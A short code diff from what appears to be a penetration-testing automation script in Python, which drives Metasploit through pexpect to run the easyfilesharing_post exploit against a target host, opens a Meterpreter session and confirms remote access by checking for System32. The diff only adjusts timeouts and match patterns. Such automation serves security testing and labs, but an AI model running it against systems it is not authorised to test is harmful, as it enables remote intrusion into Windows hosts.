@@ -25,9 +25,9 @@ def executeEasyFileSharing(target):
 
     child = pexpect.spawnu("msfconsole -q -x "+ str('"use exploit/windows/http/easyfilesharing_post ;set rhosts '+target[1] +';run"'), encoding='utf-8')
     child.logfile = sys.stdout
-    child.expect("Meterpreter session 1 opened", timeout=300)
     child.sendline("pwd")
-    if child.expect("C:\\\\WINDOWS\\\\system32",timeout=10) == 0:
+    #print(child.expect(["Meterpreter session"], timeout=300))
+    if child.expect(["System32"],timeout=50) == 0:
         print("Success")
         return child
     else:
